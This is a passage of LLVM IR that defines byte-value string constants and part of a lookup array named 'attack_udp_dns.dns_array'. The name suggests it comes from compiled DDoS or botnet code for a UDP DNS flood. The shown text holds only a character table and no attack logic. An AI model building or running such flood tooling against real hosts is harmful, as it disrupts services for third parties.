@.str.70 = private unnamed_addr constant [2 x i8] c"F\00", align 1
@.str.71 = private unnamed_addr constant [2 x i8] c"G\00", align 1
@.str.72 = private unnamed_addr constant [2 x i8] c"H\00", align 1
@.str.73 = private unnamed_addr constant [2 x i8] c"I\00", align 1
@.str.74 = private unnamed_addr constant [2 x i8] c"J\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"K\00", align 1
@.str.76 = private unnamed_addr constant [2 x i8] c"L\00", align 1
@.str.77 = private unnamed_addr constant [2 x i8] c"M\00", align 1
@.str.78 = private unnamed_addr constant [2 x i8] c"N\00", align 1
@.str.79 = private unnamed_addr constant [2 x i8] c"O\00", align 1
@.str.80 = private unnamed_addr constant [2 x i8] c"P\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"Q\00", align 1
@.str.82 = private unnamed_addr constant [2 x i8] c"R\00", align 1
@.str.83 = private unnamed_addr constant [2 x i8] c"S\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c"T\00", align 1
@.str.85 = private unnamed_addr constant [2 x i8] c"U\00", align 1
@.str.86 = private unnamed_addr constant [2 x i8] c"V\00", align 1
@.str.87 = private unnamed_addr constant [2 x i8] c"W\00", align 1
@.str.88 = private unnamed_addr constant [2 x i8] c"X\00", align 1
@.str.89 = private unnamed_addr constant [2 x i8] c"Y\00", align 1
@.str.90 = private unnamed_addr constant [2 x i8] c"Z\00", align 1
@.str.91 = private unnamed_addr constant [2 x i8] c"[\00", align 1
@.str.92 = private unnamed_addr constant [2 x i8] c"\5C\00", align 1
@.str.93 = private unnamed_addr constant [2 x i8] c"]\00", align 1
@.str.94 = private unnamed_addr constant [2 x i8] c"^\00", align 1
@.str.95 = private unnamed_addr constant [2 x i8] c"_\00", align 1
@.str.96 = private unnamed_addr constant [2 x i8] c"`\00", align 1
@.str.97 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.98 = private unnamed_addr constant [2 x i8] c"b\00", align 1
@.str.99 = private unnamed_addr constant [2 x i8] c"c\00", align 1
@.str.100 = private unnamed_addr constant [2 x i8] c"d\00", align 1
@.str.101 = private unnamed_addr constant [2 x i8] c"e\00", align 1
@.str.102 = private unnamed_addr constant [2 x i8] c"f\00", align 1
@.str.103 = private unnamed_addr constant [2 x i8] c"g\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"h\00", align 1
@.str.105 = private unnamed_addr constant [2 x i8] c"i\00", align 1
@.str.106 = private unnamed_addr constant [2 x i8] c"j\00", align 1
@.str.107 = private unnamed_addr constant [2 x i8] c"k\00", align 1
@.str.108 = private unnamed_addr constant [2 x i8] c"l\00", align 1
@.str.109 = private unnamed_addr constant [2 x i8] c"m\00", align 1
@.str.110 = private unnamed_addr constant [2 x i8] c"n\00", align 1
@.str.111 = private unnamed_addr constant [2 x i8] c"o\00", align 1
@.str.112 = private unnamed_addr constant [2 x i8] c"p\00", align 1
@.str.113 = private unnamed_addr constant [2 x i8] c"q\00", align 1
@.str.114 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.115 = private unnamed_addr constant [2 x i8] c"s\00", align 1
@.str.116 = private unnamed_addr constant [2 x i8] c"t\00", align 1
@.str.117 = private unnamed_addr constant [2 x i8] c"u\00", align 1
@.str.118 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.119 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.120 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.121 = private unnamed_addr constant [2 x i8] c"y\00", align 1
@.str.122 = private unnamed_addr constant [2 x i8] c"z\00", align 1
@.str.123 = private unnamed_addr constant [2 x i8] c"{\00", align 1
@.str.124 = private unnamed_addr constant [2 x i8] c"|\00", align 1
@.str.125 = private unnamed_addr constant [2 x i8] c"}\00", align 1
@.str.126 = private unnamed_addr constant [2 x i8] c"~\00", align 1
@.str.127 = private unnamed_addr constant [2 x i8] c"\7F\00", align 1
@.str.128 = private unnamed_addr constant [2 x i8] c"\80\00", align 1
@.str.129 = private unnamed_addr constant [2 x i8] c"\81\00", align 1
@.str.130 = private unnamed_addr constant [2 x i8] c"\82\00", align 1
@.str.131 = private unnamed_addr constant [2 x i8] c"\83\00", align 1
@.str.132 = private unnamed_addr constant [2 x i8] c"\84\00", align 1
@.str.133 = private unnamed_addr constant [2 x i8] c"\85\00", align 1
@.str.134 = private unnamed_addr constant [2 x i8] c"\86\00", align 1
@.str.135 = private unnamed_addr constant [2 x i8] c"\87\00", align 1
@.str.136 = private unnamed_addr constant [2 x i8] c"\88\00", align 1
@.str.137 = private unnamed_addr constant [2 x i8] c"\89\00", align 1
@.str.138 = private unnamed_addr constant [2 x i8] c"\8A\00", align 1
@.str.139 = private unnamed_addr constant [2 x i8] c"\8B\00", align 1
@.str.140 = private unnamed_addr constant [2 x i8] c"\8C\00", align 1
@.str.141 = private unnamed_addr constant [2 x i8] c"\8D\00", align 1
@.str.142 = private unnamed_addr constant [2 x i8] c"\8E\00", align 1
@.str.143 = private unnamed_addr constant [2 x i8] c"\8F\00", align 1
@.str.144 = private unnamed_addr constant [2 x i8] c"\90\00", align 1
@.str.145 = private unnamed_addr constant [2 x i8] c"\91\00", align 1
@.str.146 = private unnamed_addr constant [2 x i8] c"\92\00", align 1
@.str.147 = private unnamed_addr constant [2 x i8] c"\93\00", align 1
@.str.148 = private unnamed_addr constant [2 x i8] c"\94\00", align 1
@.str.149 = private unnamed_addr constant [2 x i8] c"\95\00", align 1
@.str.150 = private unnamed_addr constant [2 x i8] c"\96\00", align 1
@.str.151 = private unnamed_addr constant [2 x i8] c"\97\00", align 1
@.str.152 = private unnamed_addr constant [2 x i8] c"\98\00", align 1
@.str.153 = private unnamed_addr constant [2 x i8] c"\99\00", align 1
@.str.154 = private unnamed_addr constant [2 x i8] c"\9A\00", align 1
@.str.155 = private unnamed_addr constant [2 x i8] c"\9B\00", align 1
@.str.156 = private unnamed_addr constant [2 x i8] c"\9C\00", align 1
@.str.157 = private unnamed_addr constant [2 x i8] c"\9D\00", align 1
@.str.158 = private unnamed_addr constant [2 x i8] c"\9E\00", align 1
@.str.159 = private unnamed_addr constant [2 x i8] c"\9F\00", align 1
@.str.160 = private unnamed_addr constant [2 x i8] c"\A0\00", align 1
@.str.161 = private unnamed_addr constant [2 x i8] c"\A1\00", align 1
@.str.162 = private unnamed_addr constant [2 x i8] c"\A2\00", align 1
@.str.163 = private unnamed_addr constant [2 x i8] c"\A3\00", align 1
@.str.164 = private unnamed_addr constant [2 x i8] c"\A4\00", align 1
@.str.165 = private unnamed_addr constant [2 x i8] c"\A5\00", align 1
@.str.166 = private unnamed_addr constant [2 x i8] c"\A6\00", align 1
@.str.167 = private unnamed_addr constant [2 x i8] c"\A7\00", align 1
@.str.168 = private unnamed_addr constant [2 x i8] c"\A8\00", align 1
@.str.169 = private unnamed_addr constant [2 x i8] c"\A9\00", align 1
@.str.170 = private unnamed_addr constant [2 x i8] c"\AA\00", align 1
@.str.171 = private unnamed_addr constant [2 x i8] c"\AB\00", align 1
@.str.172 = private unnamed_addr constant [2 x i8] c"\AC\00", align 1
@.str.173 = private unnamed_addr constant [2 x i8] c"\AD\00", align 1
@.str.174 = private unnamed_addr constant [2 x i8] c"\AE\00", align 1
@.str.175 = private unnamed_addr constant [2 x i8] c"\AF\00", align 1
@.str.176 = private unnamed_addr constant [2 x i8] c"\B0\00", align 1
@.str.177 = private unnamed_addr constant [2 x i8] c"\B1\00", align 1
@.str.178 = private unnamed_addr constant [2 x i8] c"\B2\00", align 1
@.str.179 = private unnamed_addr constant [2 x i8] c"\B3\00", align 1
@.str.180 = private unnamed_addr constant [2 x i8] c"\B4\00", align 1
@.str.181 = private unnamed_addr constant [2 x i8] c"\B5\00", align 1
@.str.182 = private unnamed_addr constant [2 x i8] c"\B6\00", align 1
@.str.183 = private unnamed_addr constant [2 x i8] c"\B7\00", align 1
@.str.184 = private unnamed_addr constant [2 x i8] c"\B8\00", align 1
@.str.185 = private unnamed_addr constant [2 x i8] c"\B9\00", align 1
@.str.186 = private unnamed_addr constant [2 x i8] c"\BA\00", align 1
@.str.187 = private unnamed_addr constant [2 x i8] c"\BB\00", align 1
@.str.188 = private unnamed_addr constant [2 x i8] c"\BC\00", align 1
@.str.189 = private unnamed_addr constant [2 x i8] c"\BD\00", align 1
@.str.190 = private unnamed_addr constant [2 x i8] c"\BE\00", align 1
@.str.191 = private unnamed_addr constant [2 x i8] c"\BF\00", align 1
@.str.192 = private unnamed_addr constant [2 x i8] c"\C0\00", align 1
@.str.193 = private unnamed_addr constant [2 x i8] c"\C1\00", align 1
@.str.194 = private unnamed_addr constant [2 x i8] c"\C2\00", align 1
@.str.195 = private unnamed_addr constant [2 x i8] c"\C3\00", align 1
@.str.196 = private unnamed_addr constant [2 x i8] c"\C4\00", align 1
@.str.197 = private unnamed_addr constant [2 x i8] c"\C5\00", align 1
@.str.198 = private unnamed_addr constant [2 x i8] c"\C6\00", align 1
@.str.199 = private unnamed_addr constant [2 x i8] c"\C7\00", align 1
@.str.200 = private unnamed_addr constant [2 x i8] c"\C8\00", align 1
@.str.201 = private unnamed_addr constant [2 x i8] c"\C9\00", align 1
@.str.202 = private unnamed_addr constant [2 x i8] c"\CA\00", align 1
@.str.203 = private unnamed_addr constant [2 x i8] c"\CB\00", align 1
@.str.204 = private unnamed_addr constant [2 x i8] c"\CC\00", align 1
@.str.205 = private unnamed_addr constant [2 x i8] c"\CD\00", align 1
@.str.206 = private unnamed_addr constant [2 x i8] c"\CE\00", align 1
@.str.207 = private unnamed_addr constant [2 x i8] c"\CF\00", align 1
@.str.208 = private unnamed_addr constant [2 x i8] c"\D0\00", align 1
@.str.209 = private unnamed_addr constant [2 x i8] c"\D1\00", align 1
@.str.210 = private unnamed_addr constant [2 x i8] c"\D2\00", align 1
@.str.211 = private unnamed_addr constant [2 x i8] c"\D3\00", align 1
@.str.212 = private unnamed_addr constant [2 x i8] c"\D4\00", align 1
@.str.213 = private unnamed_addr constant [2 x i8] c"\D5\00", align 1
@.str.214 = private unnamed_addr constant [2 x i8] c"\D6\00", align 1
@.str.215 = private unnamed_addr constant [2 x i8] c"\D7\00", align 1
@.str.216 = private unnamed_addr constant [2 x i8] c"\D8\00", align 1
@.str.217 = private unnamed_addr constant [2 x i8] c"\D9\00", align 1
@.str.218 = private unnamed_addr constant [2 x i8] c"\DA\00", align 1
@.str.219 = private unnamed_addr constant [2 x i8] c"\DB\00", align 1
@.str.220 = private unnamed_addr constant [2 x i8] c"\DC\00", align 1
@.str.221 = private unnamed_addr constant [2 x i8] c"\DD\00", align 1
@.str.222 = private unnamed_addr constant [2 x i8] c"\DE\00", align 1
@.str.223 = private unnamed_addr constant [2 x i8] c"\DF\00", align 1
@.str.224 = private unnamed_addr constant [2 x i8] c"\E0\00", align 1
@.str.225 = private unnamed_addr constant [2 x i8] c"\E1\00", align 1
@.str.226 = private unnamed_addr constant [2 x i8] c"\E2\00", align 1
@.str.227 = private unnamed_addr constant [2 x i8] c"\E3\00", align 1
@.str.228 = private unnamed_addr constant [2 x i8] c"\E4\00", align 1
@.str.229 = private unnamed_addr constant [2 x i8] c"\E5\00", align 1
@.str.230 = private unnamed_addr constant [2 x i8] c"\E6\00", align 1
@.str.231 = private unnamed_addr constant [2 x i8] c"\E7\00", align 1
@.str.232 = private unnamed_addr constant [2 x i8] c"\E8\00", align 1
@.str.233 = private unnamed_addr constant [2 x i8] c"\E9\00", align 1
@.str.234 = private unnamed_addr constant [2 x i8] c"\EA\00", align 1
@.str.235 = private unnamed_addr constant [2 x i8] c"\EB\00", align 1
@.str.236 = private unnamed_addr constant [2 x i8] c"\EC\00", align 1
@.str.237 = private unnamed_addr constant [2 x i8] c"\ED\00", align 1
@.str.238 = private unnamed_addr constant [2 x i8] c"\EE\00", align 1
@.str.239 = private unnamed_addr constant [2 x i8] c"\EF\00", align 1
@.str.240 = private unnamed_addr constant [2 x i8] c"\F0\00", align 1
@.str.241 = private unnamed_addr constant [2 x i8] c"\F1\00", align 1
@.str.242 = private unnamed_addr constant [2 x i8] c"\F2\00", align 1
@.str.243 = private unnamed_addr constant [2 x i8] c"\F3\00", align 1
@.str.244 = private unnamed_addr constant [2 x i8] c"\F4\00", align 1
@.str.245 = private unnamed_addr constant [2 x i8] c"\F5\00", align 1
@.str.246 = private unnamed_addr constant [2 x i8] c"\F6\00", align 1
@.str.247 = private unnamed_addr constant [2 x i8] c"\F7\00", align 1
@.str.248 = private unnamed_addr constant [2 x i8] c"\F8\00", align 1
@.str.249 = private unnamed_addr constant [2 x i8] c"\F9\00", align 1
@.str.250 = private unnamed_addr constant [2 x i8] c"\FA\00", align 1
@.str.251 = private unnamed_addr constant [2 x i8] c"\FB\00", align 1
@.str.252 = private unnamed_addr constant [2 x i8] c"\FC\00", align 1
@.str.253 = private unnamed_addr constant [2 x i8] c"\FD\00", align 1
@.str.254 = private unnamed_addr constant [2 x i8] c"\FE\00", align 1
@.str.255 = private unnamed_addr constant [2 x i8] c"\FF\00", align 1
@attack_udp_dns.dns_array = private unnamed_addr constant [256 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr 